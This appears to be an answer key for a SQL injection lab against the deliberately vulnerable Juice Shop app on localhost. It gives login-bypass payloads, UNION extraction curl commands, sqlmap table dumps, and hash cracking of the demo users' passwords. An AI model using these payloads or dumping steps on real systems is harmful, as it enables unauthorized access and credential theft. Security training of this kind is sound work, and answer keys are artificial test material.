# Exercise 02: SQL Injection - ANSWERS

## Task 2.1: Authentication Bypass

### Solution:

**URL:** `http://localhost:3000/#/login`

**Payload for Email Field:**
```
' OR 1=1--
```

**Alternative Payloads:**
```sql
admin@juice-sh.op'--
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1#
admin'--
' UNION SELECT * FROM Users--
```

### Step-by-Step:

1. Navigate to login page
2. Enter in Email field: `' OR 1=1--`
3. Enter any password (it won't be checked)
4. Click login
5. You're now logged in as admin

### Why It Works:

The original query likely looks like:
```sql
SELECT * FROM Users WHERE email = 'user@email.com' AND password = 'hash'
```

With injection it becomes:
```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = 'hash'
```

The `--` comments out the rest of the query, and `OR 1=1` makes the WHERE clause always true.

### Admin Information:
- Email: `admin@juice-sh.op`
- User ID: 1

---

## Task 2.2: Blind SQL Injection - Data Extraction

### Vulnerable Endpoint:
**Search API:** `http://localhost:3000/rest/products/search?q=`

### Step-by-Step Exploitation:

#### 1. Confirm Vulnerability:
```bash
# Normal search
curl "http://localhost:3000/rest/products/search?q=apple"

# SQL injection test
curl "http://localhost:3000/rest/products/search?q='))--"
```

#### 2. Determine Number of Columns:
```bash
# Keep adding columns until no error
curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1--"
curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1,2--"
# ... continue until success (9 columns)
curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
```

#### 3. Extract Table Names:
```bash
curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--"
```

#### 4. Extract User Data:
```bash
# Get all users
curl "http://localhost:3000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
```

### Extracted Password Hashes:

| User ID | Email | Password Hash (MD5) |
|---------|-------|---------------------|
| 1 | admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 |
| 2 | jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
| 3 | bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef |

---

## Task 2.3: SQLMap Automation

### Step 1: Save Request to File

Create a file `request.txt`:
```
GET /rest/products/search?q=test HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0
Accept: */*
```

### Step 2: Run SQLMap

```bash
# Basic enumeration
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --level=3 --risk=3

# Enumerate tables
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --tables

# Dump Users table
sqlmap -u "http://localhost:3000/rest/products/search?q=test" -T Users --dump

# Get all databases
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --dbs
```

### SQLMap Output (Users Table):

```
+----+----------------------------+----------------------------------+
| id | email                      | password                         |
+----+----------------------------+----------------------------------+
| 1  | admin@juice-sh.op          | 0192023a7bbd73250516f069df18b500 |
| 2  | jim@juice-sh.op            | e541ca7ecf72b8d1286474fc613e5e45 |
| 3  | bender@juice-sh.op         | 0c36e517e3fa95aabf1bbffc6744a4ef |
| 4  | bjoern.kimminich@gmail.com | f27e368016b5c89d65daf5b2b4d42c3f |
+----+----------------------------+----------------------------------+
```

---

## Password Cracking

### Using Hashcat:

```bash
# Create hash file
echo "0192023a7bbd73250516f069df18b500" > hashes.txt
echo "e541ca7ecf72b8d1286474fc613e5e45" >> hashes.txt
echo "0c36e517e3fa95aabf1bbffc6744a4ef" >> hashes.txt

# Crack with rockyou
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Using John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
```

### Online Cracking:

Use https://crackstation.net or https://hashes.com/en/decrypt/hash

### Cracked Passwords:

| Hash | Password |
|------|----------|
| 0192023a7bbd73250516f069df18b500 | admin123 |
| e541ca7ecf72b8d1286474fc613e5e45 | ncc-1701 |
| 0c36e517e3fa95aabf1bbffc6744a4ef | OhG0dPlease1nsertLiquworHere! |

---

## Summary of SQL Injection Vulnerabilities:

```
Vulnerable Endpoints:
1. /rest/user/login (email field)
2. /rest/products/search (q parameter)

Successful Payloads:
1. ' OR 1=1-- (auth bypass)
2. '))UNION SELECT... (data extraction)

Extracted Data:
- Full Users table with password hashes
- Admin Email: admin@juice-sh.op
- Cracked admin password: admin123
```
